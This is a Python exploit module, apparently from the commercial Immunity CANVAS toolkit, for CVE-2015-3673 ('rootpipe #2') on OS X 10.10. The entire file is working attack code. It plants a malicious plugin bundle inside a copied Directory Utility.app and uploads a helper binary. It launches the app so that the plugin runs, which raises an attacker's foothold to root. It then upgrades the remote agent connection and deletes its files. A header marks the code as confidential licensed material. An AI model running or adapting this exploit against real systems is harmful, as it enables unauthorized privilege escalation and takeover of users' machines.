#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import time

from exploitutils import *
from canvaserror import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'OS X XPC Admin Framework (rootpipe #2) local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2015-3673'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3673'
DOCUMENTATION['References']    = 'https://truesecdev.wordpress.com/2015/07/01/exploiting-rootpipe-again/'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X', 'All'] ]
PROPERTY['VERSION']            = [ '10.10' ]

DOCUMENTATION['Notes']         = """

Rootpipe #2 for Mac OS X 10.10.3
"""

class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_helper       = self.local_helper_64
        self.local_exp          = os.path.join(self.local_res, 'x')
        self.local_info         = os.path.join(self.local_res, 'Info.plist')
        self.remote_app         = '/System/Library/CoreServices/Applications/Directory\ Utility.app'
        self.remote_tmp_dir     = '/tmp/Directory Utility.app'
        self.remote_bundle      = os.path.join(self.remote_tmp_dir, 'Contents/Plugins/x.daplug')
        self.remote_info        = os.path.join(self.remote_bundle, "Contents", os.path.basename(self.local_info))
        self.remote_exp         = os.path.join(self.remote_bundle, "Contents", "MacOS", os.path.basename(self.local_exp))
        self.remote_app_bin     = '/tmp/Directory Utility.app/Contents/MacOS/Directory Utility'
        self.remote_helper      = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                self.log_error("Node has no shell server available")
                self.log_error("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue

            if self.is_32bit_node():
                continue

            if self.compromised(self.remote_helper, 0):
                self.nlog('Already compromised')
                self.nlog('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.cleanup()
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                continue

            # Copy Directory Utility.app into tmp
            self.node.shell.runcommand("cp -r %s /tmp/" % self.remote_app)

            # Create directory hierarchy on target node (for bundle) and upload exploit
            self.log_info('Uploading helper and exploit')
            self.node.shell.mkdir(self.remote_bundle)
            self.node.shell.mkdir(os.path.join(self.remote_bundle, "Contents"))
            self.node.shell.mkdir(os.path.join(self.remote_bundle, "Contents", "MacOS"))

            if self.nodeUpload(self.local_info, self.remote_info) == False:
                self.setInfo("%s Done (Failed to upload Info.plist)" % (self.name))
                continue

            self.setProgress(30)

            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.setProgress(50)

            if self.nodeUpload(self.local_helper, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(70)

            # Run Directory Utility.app which will load our plugin (exploit)
            self.nlog("Executing exploit")
            self.fork_and_exec(self.remote_app_bin)

            self.nlog('Waiting...')
            self.setProgress(90)

            # wait 2 secs for the exploit to complete
            wait_secs = 2
            if self.compromised(self.remote_helper, wait_secs):
                self.log_info('Compromised!')
                self.nlog('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                self.log_error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

            # Cleanup
            self.cleanup()
            self.node.shell.runcommand("rm -rf %s" % self.remote_tmp_dir.replace(" ", "\ "))
            self.node.shell.runcommand('killall "Directory Utility"')

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
